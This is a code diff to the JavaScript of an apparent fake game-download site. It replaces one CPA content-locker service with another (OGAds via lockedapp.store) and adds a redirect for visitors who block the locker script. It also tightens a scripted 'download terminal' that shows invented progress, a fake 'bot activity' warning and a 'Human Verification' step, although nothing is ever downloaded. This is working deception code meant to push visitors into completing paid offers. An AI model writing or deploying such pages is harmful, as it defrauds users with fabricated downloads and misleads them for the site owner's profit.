@@ -138,37 +138,49 @@ function showLocker() {
     document.getElementById('locker').style.display = 'flex';
 }
 
-/* === CPA LOCKER TRIGGER === */
+/* === CPA LOCKER TRIGGER (OGAds) === */
 function callCpaOffer() {
-    // Show loading state on the button
+    // UI Feedback
     const btn = document.querySelector('.locker-box .btn-download');
-    if (btn) {
-        btn.innerHTML = '<span class="spinner"></span> Loading...';
-        btn.style.opacity = '0.7';
-        btn.style.pointerEvents = 'none'; // Prevent double clicks
+    if (btn) btn.innerHTML = 'Verify Now';
 
-        // Reset button after 5 seconds just in case user cancels or script fails
-        setTimeout(() => {
-            btn.innerHTML = 'VERIFY NOW';
-            btn.style.opacity = '1';
-            btn.style.pointerEvents = 'auto';
-        }, 8000);
-    }
+    // 1. Set the block variable
+    window.ogblock = true;
 
-    // Force reload of the MyLead Locker Script
-    const existingScript = document.getElementById('cpljs-55342532-05e0-11f1-b673-4e5c1971bddc');
-    if (existingScript) {
-        existingScript.remove();
-    }
+    // 2. Remove any old script instance
+    const oldScript = document.getElementById('ogjs');
+    if (oldScript) oldScript.remove();
 
+    // 3. Create and inject the script
     const script = document.createElement('script');
     script.type = 'text/javascript';
-    script.id = 'cpljs-55342532-05e0-11f1-b673-4e5c1971bddc';
-    script.src = 'https://bestlocker.eu/iframeLoader/55342532-05e0-11f1-b673-4e5c1971bddc?allow_translate=1';
+    script.id = 'ogjs';
+    script.src = 'https://lockedapp.store/cl/js/m55o98';
+
+    // 4. AdBlock / Load Handling
+    script.onload = function () {
+        window.ogblock = false;
+        console.log("Locker script loaded.");
+    };
+
+    script.onerror = function () {
+        console.log("Locker script failed to load.");
+        window.location.href = "https://lockedapp.store/adblock";
+    };
+
+    // Append to body (standard placement)
     document.body.appendChild(script);
+
+    // 5. Fallback Check (Delayed)
+    // We give it 2 seconds. If ogblock is still true, we assume blockage.
+    setTimeout(function () {
+        if (window.ogblock) {
+            window.location.href = "https://lockedapp.store/adblock";
+        }
+    }, 2000);
 }
 
-/* === ADDED: DOWNLOAD PAGE LOGIC (Restored & Updated) === */
+/* === DOWNLOAD PAGE LOGIC (Optimized 3 Seconds) === */
 function startDownloadProcess(gameName) {
     const btn = document.querySelector('.btn-download');
     const terminal = document.getElementById('terminal');
@@ -182,20 +194,20 @@ function startDownloadProcess(gameName) {
         btn.style.display = 'none';
         terminal.style.display = 'block';
 
-        // Use the same terminal style as Roblox but with download steps
+        // Fast Animation Steps (~3 seconds total)
         const steps = [
-            { msg: "Establishing secure connection...", delay: 500 },
-            { msg: "Verifying device compatibility...", delay: 1500 },
-            { msg: `Requesting package: ${gameName}...`, delay: 2500 },
-            { msg: "Package found (v2.4) - 4.5GB", type: "success", delay: 3500 },
-            { msg: "Allocating storage space...", delay: 4500 },
-            { msg: "Starting encrypted download stream...", delay: 5500 },
-            { msg: "Downloading... 12%", delay: 6500 },
-            { msg: "Downloading... 34%", delay: 7500 },
-            { msg: "Downloading... 78%", delay: 8500 },
-            { msg: "Network anomaly detected!", type: "warn", delay: 9500 },
-            { msg: "Bot activity suspected. Pausing...", type: "error", delay: 10500 },
-            { msg: "Redirecting to Human Verification...", type: "warn", delay: 11500 }
+            { msg: "Establishing secure connection...", delay: 200 },
+            { msg: "Verifying device compatibility...", delay: 500 },
+            { msg: `Requesting package: ${gameName}...`, delay: 800 },
+            { msg: "Package found (v2.4) - 4.5GB", type: "success", delay: 1100 },
+            { msg: "Allocating storage space...", delay: 1400 },
+            { msg: "Starting encrypted download stream...", delay: 1700 },
+            { msg: "Downloading... 12%", delay: 2000 },
+            { msg: "Downloading... 56%", delay: 2200 },
+            { msg: "Downloading... 98%", delay: 2400 },
+            { msg: "Validating file integrity...", delay: 2600 },
+            { msg: "Bot activity suspected. Pausing...", type: "error", delay: 2800 },
+            { msg: "Redirecting to Human Verification...", type: "warn", delay: 3000 }
         ];
 
         steps.forEach(step => {
@@ -207,11 +219,11 @@ function startDownloadProcess(gameName) {
                 terminal.scrollTop = terminal.scrollHeight; // Auto scroll
 
                 if (step.msg.includes("Human Verification")) {
-                    setTimeout(showLocker, 1000);
+                    setTimeout(showLocker, 500);
                 }
             }, step.delay);
         });
-    }, 1000);
+    }, 500);
 }
 
 /* === Add Shake Animation Keyframes via JS (if not in CSS) === */
